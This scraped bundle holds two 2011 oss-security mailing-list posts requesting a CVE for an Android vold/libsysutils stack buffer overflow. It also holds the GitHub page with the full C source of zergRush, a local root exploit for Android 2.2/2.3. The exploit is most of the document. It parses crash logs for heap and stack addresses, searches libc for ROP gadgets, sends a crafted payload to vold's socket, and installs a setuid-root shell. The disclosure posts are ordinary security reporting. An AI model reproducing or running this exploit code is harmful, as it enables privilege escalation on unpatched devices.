=== Content from www.openwall.com_db4c722a_20250125_150054.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[<thread-prev]](3) [[thread-next>]](10) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAOSRhROHk-cYEuNJ--UCN7vC3M9nCu1+egiQ4xETApW_XBkf5w@mail.gmail.com>
Date: Tue, 8 Nov 2011 08:08:35 -0500
From: Dan Rosenberg <dan.j.rosenberg@...il.com>
To: oss-security@...ts.openwall.com
Subject: Re: CVE request: Android: vold stack buffer overflow

On Tue, Nov 8, 2011 at 8:03 AM, Dan Rosenberg <dan.j.rosenberg@...il.com> wrote:
> A local user with group "log" on Android may send a malformed message
> to vold ("volume daemon"), causing a stack buffer overflow.  This has
> been demonstrated to be exploitable to escalate privileges to root on
> all Froyo (2.2.x) and Gingerbread (2.4.x)  devices via freeing an
> arbitrary heap object and triggering a use-after-free condition [1].
> It appears the bug was silently patched in Honeycomb (3.x), but note
> that since Honeycomb is not open source, it does not fall within the
> scope of this list.  Bug discovered and exploited by the Revolutionary
> team [2].
>

Oops, a few minor corrections.

Typo: Gingerbread is 2.3.x.  Also, the vulnerability actually lives in
the libsysutils library, and was demonstrated to be exploitable via
vold, which makes use of the affected library function.  Sorry for the
noise.

> -Dan
>
> [1] <https://github.com/revolutionary/zergRush/blob/master/zergRush.c>
> [2] <http://revolutionary.io/>
>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_a2975bf4_20250125_150057.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frevolutionary%2FzergRush%2Fblob%2Fmaster%2FzergRush.c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frevolutionary%2FzergRush%2Fblob%2Fmaster%2FzergRush.c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=revolutionary%2FzergRush)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[revolutionary](/revolutionary)
/
**[zergRush](/revolutionary/zergRush)**
Public

* [Notifications](/login?return_to=%2Frevolutionary%2FzergRush) You must be signed in to change notification settings
* [Fork
  163](/login?return_to=%2Frevolutionary%2FzergRush)
* [Star
   344](/login?return_to=%2Frevolutionary%2FzergRush)

* [Code](/revolutionary/zergRush)
* [Issues
  3](/revolutionary/zergRush/issues)
* [Pull requests
  0](/revolutionary/zergRush/pulls)
* [Actions](/revolutionary/zergRush/actions)
* [Projects
  0](/revolutionary/zergRush/projects)
* [Wiki](/revolutionary/zergRush/wiki)
* [Security](/revolutionary/zergRush/security)
* [Insights](/revolutionary/zergRush/pulse)

Additional navigation options

* [Code](/revolutionary/zergRush)
* [Issues](/revolutionary/zergRush/issues)
* [Pull requests](/revolutionary/zergRush/pulls)
* [Actions](/revolutionary/zergRush/actions)
* [Projects](/revolutionary/zergRush/projects)
* [Wiki](/revolutionary/zergRush/wiki)
* [Security](/revolutionary/zergRush/security)
* [Insights](/revolutionary/zergRush/pulse)

## Files

 master
## Breadcrumbs

1. [zergRush](/revolutionary/zergRush/tree/master)
/
# zergRush.c

Copy path Blame  Blame
## Latest commit

## History

[History](/revolutionary/zergRush/commits/master/zergRush.c)653 lines (546 loc) · 14.5 KB master
## Breadcrumbs

1. [zergRush](/revolutionary/zergRush/tree/master)
/
# zergRush.c

Top
## File metadata and controls

* Code
* Blame

653 lines (546 loc) · 14.5 KB[Raw](https://github.com/revolutionary/zergRush/raw/refs/heads/master/zergRush.c)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652/\* zergRush \* android 2.2/2.3 libsysutils root exploit use-after-free \* Copyright (c) 2011, The Revolutionary development team. \* \* This program is free software: you can redistribute it and/or modify it \* under the terms of the GNU General Public License as published by the \* Free Software Foundation, either version 3 of the License, or (at your \* option) any later version. \* \* This program is distributed in the hope that it will be useful, but \* WITHOUT ANY WARRANTY; without even the implied warranty of \* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General \* Public License for more details. \* \* You should have received a copy of the GNU General Public License along \* with this program. If not, see <http://www.gnu.org/licenses/>. \*/
/\* \* Exploited by rewriting a FrameworkCommand object making the runCommand \* point to our first ROP gadget. \* \* Before using, insert empty formatted sdcard. USE IT AT YOUR OWN RISK, \* THIS PROGRAM MIGHT NOT WORK OR MAKES YOUR DEVICE USELESS/BRICKED. SO BE \* WARNED! I AM NOT RESPONSIBLE FOR ANY DAMAGE IT MIGHT CAUSE! \* \* It only works if called from adb shell since we need group log. \* \* Compile: \* agcc zergRush.c -o zergRush -ldiskconfig -lcutils \* \*/#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <string.h>#include <signal.h>#include <errno.h>#include <fcntl.h>
#include <sys/mount.h>#include <sys/socket.h>#include <sys/select.h>#include <sys/time.h>#include <sys/types.h>#include <sys/un.h>
#include <dirent.h>
#include <dlfcn.h>
#include <sys/system\_properties.h>#include <cutils/sockets.h>#include <private/android\_filesystem\_config.h>
static pid\_t logcat\_pid = 0;static char \*sh = "/data/local/tmp/sh";static char \*bsh = "/data/local/tmp/boomsh";static char \*crashlog = "/data/local/tmp/crashlog";static char \*vold = "/system/bin/vold";
uint32\_t heap\_addr;uint32\_t libc\_base;uint32\_t heap\_base\_addr;uint32\_t heap\_offset;uint32\_t r9 = 0, r10 = 0, fp = 0;uint32\_t stack\_addr = 0x41414141;uint32\_t system\_ptr = 0;uint32\_t stack\_pivot = 0x41414141;uint32\_t pop\_r0 = 0x41414141;uint32\_t jumpsz = 0;uint32\_t gadget\_jumpsz = 108;uint32\_t buffsz = 0;uint32\_t allbuffsz[] = {16,24,0};
uint8\_t adjust = 0;
uint8\_t samsung = 0;
extern char \*\*environ;
static void die(const char \*msg){ perror(msg); exit(errno);}
static int copy(const char \*from, const char \*to){ int fd1, fd2; char buf[0x1000]; int r = 0;
 if ((fd1 = open(from, O\_RDONLY)) < 0) return -1; if ((fd2 = open(to, O\_RDWR|O\_CREAT|O\_TRUNC, 0600)) < 0) { close(fd1); return -1; }  for (;;) { r = read(fd1, buf, sizeof(buf)); if (r <= 0) break; if (write(fd2, buf, r) != r) break; }  close(fd1); close(fd2); sync(); sync(); return r;}
static int remount\_data(const char \*mntpoint){ FILE \*f = NULL; int found = 0; char buf[1024], \*dev = NULL, \*fstype = NULL;
 if ((f = fopen("/proc/mounts", "r")) == NULL) return -1;  memset(buf, 0, sizeof(buf)); for (;!feof(f);) { if (fgets(buf, sizeof(buf), f) == NULL) break; if (strstr(buf, mntpoint)) { found = 1; break; } } fclose(f); if (!found) return -1; if ((dev = strtok(buf, " \t")) == NULL) return -1; if (strtok(NULL, " \t") == NULL) return -1; if ((fstype = strtok(NULL, " \t")) == NULL) return -1; return mount(dev, mntpoint, fstype, MS\_REMOUNT, 0);}
static void \*find\_symbol(char \*sym){ void \*r = NULL; void \*dlh = dlopen("/system/libc/libc.so", RTLD\_NOW);  if (!dlh) die("[-] dlopen"); if ((r = (void \*)dlsym(dlh, sym)) == NULL) die("[-] dlsym"); dlclose(dlh); return r;}
static int bad\_byte(uint8\_t byte){ switch(byte) { case 0x20: case 0x22: case 0x5c: case 0x00: return 1; break; default: break; } return 0;}
static void heap\_oracle() { char ok = 1; if (r9 > heap\_base\_addr && r9 < (heap\_base\_addr+0x10000)) heap\_addr = r9 + 0x70; else if (r10 > heap\_base\_addr && r10 < (heap\_base\_addr+0x10000)) heap\_addr = r10 + 0x70; else if (fp > heap\_base\_addr && fp < (heap\_base\_addr+0x10000)) heap\_addr = fp + 0x70; else ok = 0;
 while(bad\_byte(heap\_addr&0xff)) heap\_addr += 0x20; if(ok) printf("[+] Overseer found a path ! 0x%08x\n", heap\_addr); else { printf("[-] No path found, let's hope ...\n"); heap\_addr = heap\_base\_addr + heap\_offset; }}
static int check\_addr(uint32\_t addr){ /\* \* Check if address contains one of the forbidden bytes \*/ int i = 0;
 for(i=0; i<32; i+=8) if(bad\_byte((addr>>i) & 0xff)) return -1;
 return 0;}
static int do\_fault(){ char buf[255]; int sock = -1, n = 0, i; char s\_stack\_addr[5], s\_stack\_pivot\_addr[5], s\_pop\_r0\_addr[5], s\_system[5], s\_bsh\_addr[5], s\_heap\_addr[5]; uint32\_t bsh\_addr; char padding[128]; int32\_t padding\_sz = (jumpsz == 0 ? 0 : gadget\_jumpsz - jumpsz);
 if(samsung) { printf("[\*] Sleeping a bit (~40s)...\n"); sleep(40); printf("[\*] Waking !\n"); }
 memset(padding, 0, 128); strcpy(padding, "LORDZZZZzzzz"); if(padding\_sz > 0) { memset(padding+12, 'Z', padding\_sz); printf("[\*] Popping %d more zerglings\n", padding\_sz); } else if(padding\_sz < 0) { memset(padding, 0, 128); memset(padding, 'Z', 12+padding\_sz); }
 if ((sock = socket\_local\_client("vold", ANDROID\_SOCKET\_NAMESPACE\_RESERVED, SOCK\_STREAM)) < 0) die("[-] Error creating Nydus");
 sprintf(s\_stack\_addr, "%c%c%c%c", stack\_addr & 0xff, (stack\_addr>>8)&0xff, (stack\_addr>>16)&0xff, (stack\_addr>>24)&0xff); sprintf(s\_stack\_pivot\_addr, "%c%c%c%c", stack\_pivot & 0xff, (stack\_pivot>>8)&0xff, (stack\_pivot>>16)&0xff, (stack\_pivot>>24)&0xff); sprintf(s\_pop\_r0\_addr, "%c%c%c%c", pop\_r0 & 0xff, (pop\_r0>>8)&0xff, (pop\_r0>>16)&0xff, (pop\_r0>>24)&0xff); sprintf(s\_system, "%c%c%c%c", system\_ptr & 0xff, (system\_ptr>>8)&0xff, (system\_ptr>>16)&0xff, (system\_ptr>>24)&0xff); sprintf(s\_heap\_addr, "%c%c%c%c", heap\_addr & 0xff, (heap\_addr>>8)&0xff, (heap\_addr>>16)&0xff, (heap\_addr>>24)&0xff);
 if(adjust) strcpy(buf, "ZERGZERG"); else strcpy(buf, "ZERG"); strcat(buf, " ZZ "); strcat(buf, s\_stack\_pivot\_addr); for(i=3; i < buffsz+1; i++) strcat(buf, " ZZZZ"); strcat(buf, " "); strcat(buf, s\_heap\_addr);  n = strlen(buf); bsh\_addr = stack\_addr + n + 1 + 8 + 8 + 8 + padding\_sz + 12 + 4;  if(check\_addr(bsh\_addr) == -1) { printf("[-] Colossus, we're doomed!\n"); exit(-1); }
 sprintf(s\_bsh\_addr, "%c%c%c%c", bsh\_addr & 0xff, (bsh\_addr>>8)&0xff, (bsh\_addr>>16)&0xff, (bsh\_addr>>24)&0xff);
 n += sprintf(buf+n+1, "%s%s OVER%s%s%s%sZZZZ%s%c", s\_stack\_addr, s\_heap\_addr, padding, s\_pop\_r0\_addr, s\_bsh\_addr, s\_system, bsh, 0);  printf("[\*] Sending %d zerglings ...\n", n);
 if ((n = write(sock, buf, n+1)) < 0) die("[-] Nydus seems broken");  sleep(3); close(sock);
 return n;}
static int find\_rop\_gadgets(){ /\* \* add sp, #108 -> b01b \* pop {r4, r5, r6, r7, pc} -> bdf0 \* \* pop {r0, pc} -> bd01 \*/ int fd; char r[2], d[2]; int n = 2; int bad = 0;
 if((fd=open("/system/lib/libc.so", O\_RDONLY)) == -1) die("[-] open");  lseek(fd, 0x10000, SEEK\_SET);
 while(n == 2 && (stack\_pivot == 0x41414141 || pop\_r0 == 0x41414141)) { n = read(fd, r, 2); switch(r[0]) { case '\x1b': if(stack\_pivot == 0x41414141) { if(r[1] == '\xb0') { n = read(fd, d, 2); if(d[0] == '\xf0' && d[1] == '\xbd') { stack\_pivot = libc\_base + lseek(fd, 0, SEEK\_CUR) - 4 + 1; if(check\_addr(stack\_pivot) == -1) stack\_pivot = 0x41414141; } } } break; case '\x01': if(pop\_r0 == 0x41414141) { if(r[1] == '\xbd') { pop\_r0 = libc\_base + lseek(fd, 0, SEEK\_CUR) - 2 + 1; if(check\_addr(pop\_r0) == -1) pop\_r0 = 0x41414141; } } break; default: break; } }  if (stack\_pivot == 0x41414141) { printf("[-] You need more minerals !\n"); bad = -1; }
 if (pop\_r0 == 0x41414141) { printf("[-] You need more vespene gas !\n"); bad = -1; }
 if(bad == -1) exit(-1);
 return 0;}
static uint32\_t checkcrash(){ uint32\_t fault\_addr = 0; char buf[1024], \*ptr = NULL; FILE \*f = NULL; long pos = 0; int ret=0;
 system("/system/bin/logcat -c"); unlink(crashlog);
 if ((logcat\_pid = fork()) == 0) { char \*a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL}; execve(\*a, a, environ); exit(1); } sleep(3);
 if (do\_fault() < 0) die("[-] Zerglings did not cause crash"); /\* Give logcat time to write to file \*/ sleep(3); if ((f = fopen(crashlog, "r")) == NULL) die("[-] Zerglings did not leave stuff at all"); fseek(f, pos, SEEK\_SET); do { memset(buf, 0, sizeof(buf)); if (!fgets(buf, sizeof(buf), f)) break; if ((ptr = strstr(buf, " sp ")) != NULL) ret = 1; if ((ptr = strstr(buf, " r9 ")) != NULL) { ptr += 5; r9 = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " 10 ")) != NULL) { ptr += 5; r10 = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " fp ")) != NULL) { ptr += 5; fp = (uint32\_t)strtoul(ptr, NULL, 16); } } while (!feof(f)); pos = ftell(f); fclose(f);
 return ret;}
static uint32\_t check\_libc\_base(){ char buf[1024], \*ptr = NULL; FILE \*f = NULL; long pos = 0; int ret=0; uint32\_t spotted\_base = 0;
 if ((f = fopen(crashlog, "r")) == NULL) die("[-] Zerglings did not leave stuff at all"); fseek(f, pos, SEEK\_SET); do { memset(buf, 0, sizeof(buf)); if (!fgets(buf, sizeof(buf), f)) break; if ((ptr = strstr(buf, " /system/lib/libc.so")) != NULL) { ptr -= 8; spotted\_base = strtoul(ptr, NULL, 16) & 0xfff00000; if(spotted\_base && spotted\_base != libc\_base) { libc\_base = spotted\_base; ret = 1; } } } while (!feof(f) && !spotted\_base); pos = ftell(f); fclose(f);
 return ret;}
static uint32\_t find\_stack\_addr(){ uint32\_t fault\_addr = 0; char buf[1024], \*ptr = NULL; FILE \*f = NULL; long pos = 0; uint32\_t sp=0, over=0;
 system("/system/bin/logcat -c"); unlink(crashlog);
 if ((logcat\_pid = fork()) == 0) { char \*a[] = {"/system/bin/logcat", "-b", "main", "-f", crashlog, NULL}; execve(\*a, a, environ); exit(1); } sleep(3);
 if (do\_fault() < 0) die("[-] Zerglings did not cause crash"); /\* Give logcat time to write to file \*/ sleep(3); if ((f = fopen(crashlog, "r")) == NULL) die("[-] Zerglings did not leave stuff at all"); fseek(f, pos, SEEK\_SET); do { memset(buf, 0, sizeof(buf)); if (!fgets(buf, sizeof(buf), f)) break; if ((ptr = strstr(buf, " 4752455a")) != NULL && stack\_addr == 0x41414141) { ptr -= 8; stack\_addr = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " 5245564f")) != NULL && !over) { ptr -= 8; over = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " sp ")) != NULL && !sp) { ptr += 5; sp = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " r9 ")) != NULL) { ptr += 5; r9 = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " 10 ")) != NULL) { ptr += 5; r10 = (uint32\_t)strtoul(ptr, NULL, 16); } if ((ptr = strstr(buf, " fp ")) != NULL) { ptr += 5; fp = (uint32\_t)strtoul(ptr, NULL, 16); }
 } while (!feof(f)); pos = ftell(f); fclose(f);
 if(over && sp) jumpsz = over - sp;  return stack\_addr;}
static void do\_root(){ remount\_data("/data"); chown(sh, 0, 0); chmod(sh, 04711); property\_set("ro.kernel.qemu","1"); exit(0);}
int main(int argc, char \*\*argv, char \*\*env){ uint32\_t i = 0, ok = 0; char \*ash[] = {sh, 0}; struct stat st; char version\_release[1024]; int tries=0;
 if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh")) do\_root();
 printf("\n[\*\*] Zerg rush - Android 2.2/2.3 local root\n"); printf("[\*\*] (C) 2011 Revolutionary. All rights reserved.\n\n"); printf("[\*\*] Parts of code from Gingerbreak, (C) 2010-2011 The Android Exploid Crew.\n\n");
 if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0) die("[-] Cannot copy boomsh.");
 chmod(bsh, 0711);
 stat(vold, &st); heap\_base\_addr = ((((st.st\_size) + 0x8000) / 0x1000) + 1) \* 0x1000;
 \_\_system\_property\_get("ro.build.version.release", version\_release);
 if (strstr(version\_release, "2.2")) { heap\_offset = 0x108; printf("[+] Found a Froyo ! 0x%08x\n", heap\_offset); } else if (strstr(version\_release, "2.3")) { heap\_offset = 0x118; printf("[+] Found a GingerBread ! 0x%08x\n", heap\_offset); } else { printf("[-] Not a 2.2/2.3 Android ...\n"); exit(-1); }
 heap\_addr = 0xffffff;
 \_\_system\_property\_get("ro.build.fingerprint", version\_release); if(!strncmp(version\_release, "samsung", 7)) { printf("[+] Found a Samsung, running Samsung mode\n"); samsung = 1; }
 system\_ptr = (uint32\_t) find\_symbol("system"); libc\_base = system\_ptr & 0xfff00000;
 if (check\_addr(system\_ptr) == -1) { printf("[-] High templars, we're doomed!\n"); exit(-1); }
 tries = 0; printf("[\*] Scooting ...\n"); while(buffsz=allbuffsz[tries]) { if(checkcrash()) { printf("[+] Zerglings found a way to enter ! 0x%02x\n", buffsz); break; } tries++; }
 if(!buffsz) { printf("[-] Hellions with BLUE flames !\n"); exit(-1); }
 for (tries = 0; tries < 2; tries++) { heap\_oracle(); find\_stack\_addr();
 if (stack\_addr != 0x41414141 && jumpsz) { printf("[+] Zerglings caused crash (good news): 0x%08x 0x%04x\n", stack\_addr, jumpsz); break; } }  if (stack\_addr == 0x41414141 || !jumpsz) { printf("[-] Zerglings did not leave interesting stuff\n"); exit(-1); }  if (check\_addr(stack\_addr) == -1) { if(bad\_byte(stack\_addr & 0xff)) { stack\_addr += 4; adjust = 4; if (check\_addr(stack\_addr) == -1) { printf("[-] Siege tanks, we're doomed!\n"); exit(-1); } } else { printf("[-] Siege tanks, we're doomed!\n"); exit(-1); } }
 if (jumpsz > 108 + 12) { printf("[-] This terran has walled!\n"); exit(-1); }
 if(check\_libc\_base()) { system\_ptr = libc\_base + (system\_ptr & 0x000fffff); printf("[\*] Creating more creep 0x%08x ...\n", system\_ptr);
 if (check\_addr(system\_ptr) == -1) { printf("[-] High templars, we're doomed!\n"); exit(-1); } }
 kill(logcat\_pid, SIGKILL); unlink(crashlog);
 printf("[\*] Researching Metabolic Boost ...\n"); find\_rop\_gadgets(); printf("[+] Speedlings on the go ! 0x%08x 0x%08x\n", stack\_pivot, pop\_r0);
 do\_fault(); stat(sh, &st); if ((st.st\_mode & 04000) == 04000) { char qemuprop[1];
 printf("\n[+] Rush did it ! It's a GG, man !\n"); property\_get("ro.kernel.qemu",qemuprop,"0");
 if (qemuprop[0]=='1') { printf("[+] Killing ADB and restarting as root... enjoy!\n"); fflush(stdout); sleep(1); kill(-1, SIGTERM); } else { printf("[-] Failed to set property to restart adb. Not killing.\n"); } } else { printf("\n[-] Bad luck, our rush did not succeed :(\n"); fflush(stdout); sleep(1); kill(-1, SIGTERM); }
 return 0;}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_093ba726_20250125_150054.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[thread-next>]](4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <CAOSRhROOAg33GnudkF910gx+a3Ee=VY3Z=qKOVJ3HngwUK_0Ww@mail.gmail.com>
Date: Tue, 8 Nov 2011 08:03:45 -0500
From: Dan Rosenberg <dan.j.rosenberg@...il.com>
To: oss-security@...ts.openwall.com
Subject: CVE request: Android: vold stack buffer overflow

A local user with group "log" on Android may send a malformed message
to vold ("volume daemon"), causing a stack buffer overflow.  This has
been demonstrated to be exploitable to escalate privileges to root on
all Froyo (2.2.x) and Gingerbread (2.4.x)  devices via freeing an
arbitrary heap object and triggering a use-after-free condition [1].
It appears the bug was silently patched in Honeycomb (3.x), but note
that since Honeycomb is not open source, it does not fall within the
scope of this list.  Bug discovered and exploited by the Revolutionary
team [2].

-Dan

[1] <https://github.com/revolutionary/zergRush/blob/master/zergRush.c>
[2] <http://revolutionary.io/>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.openwall.com_7fadc421_20250125_150055.html ===


